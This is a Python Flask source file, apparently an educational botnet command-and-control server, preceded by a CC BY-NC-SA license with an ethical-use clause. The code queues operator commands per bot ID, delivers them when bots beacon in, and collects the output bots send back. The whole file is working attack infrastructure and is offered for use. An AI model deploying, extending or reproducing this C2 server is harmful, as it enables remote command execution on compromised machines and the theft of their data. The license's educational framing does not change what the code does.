# Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International
## CC BY-NC-SA 4.0
#  [Full Legal Code](https://creativecommons.org/licenses/by-nc-sa/4.0/legalcode)

### You are free to:
#- **Share** — copy and redistribute the material
#- **Adapt** — remix, transform, and build upon the material

### Under these terms:
#- **Attribution** — You must give appropriate credit, provide a link to the license, and indicate if changes were made.
#- **NonCommercial** — You may not use the material for commercial purposes.
#- **ShareAlike** — If you remix, transform, or build upon the material, you must distribute your contributions under the same license.

### Additional Educational Restrictions:
# 1. **Ethical Use Clause**  
#   This software is provided solely for:
#   - Academic research
#   - Cybersecurity education
#   - Defensive security training

# 2. **Prohibited Uses**  
#   Explicitly forbidden:
#   - Malicious hacking
#   - Unauthorized penetration testing
#   - Military/weapons applications
#   - Commercial security products

# 3. **Liability**  
#   The licensor bears no responsibility for misuse of this software.

from flask import Flask, request, jsonify

app = Flask(__name__)
# Comand and Control Center C2 Server
command_queue = {}
bot_outputs = {}

@app.route('/command', methods=['POST'])
def command():
    """Set Bot commands"""
    bot_data = request.json
    bid=bot_data['bot_id']
    cmd=bot_data['command']
    print(f"[+] New command: {cmd} to be sent to {bid}")

    # Echo the command to the bot
    global command_queue
    command_queue[bot_data['bot_id']] = {
        "command": cmd,
        "bot_id": bid
    }
    return jsonify(command_queue[bot_data['bot_id']])

@app.route('/beacon', methods=['POST'])
def beacon():
    """Handle bot check-ins and send commands"""
    bot_data = request.json
    bid=bot_data['bot_id']
    print(f"[+] Bot run on {bot_data['arch']} checked in: {bid} ")

    global command_queue
    if bid in command_queue:
       print(f"[*] Command : {command_queue[bid]} send to the bot {bid}")
       return jsonify(command_queue[bid])
    else:
       return jsonify({"status": "Wating instructions from Bot Master..."})

@app.route('/ack', methods=['POST'])
def ack():
    """Receive command execution results"""
    ack_data = request.json
    print(f"\n[+] Received output from {ack_data['bot_id']}:")
    print(f"Output:\n{ack_data['output']}\n")
    
    # Store the output (could save to database)
    bot_outputs[ack_data['bot_id']] = ack_data
    
    return jsonify({"status": "ack_received"})

if __name__ == '__main__':
    print(f"[*] C2 server starting...")
    app.run(host='127.0.0.1', port=5000, debug=True)
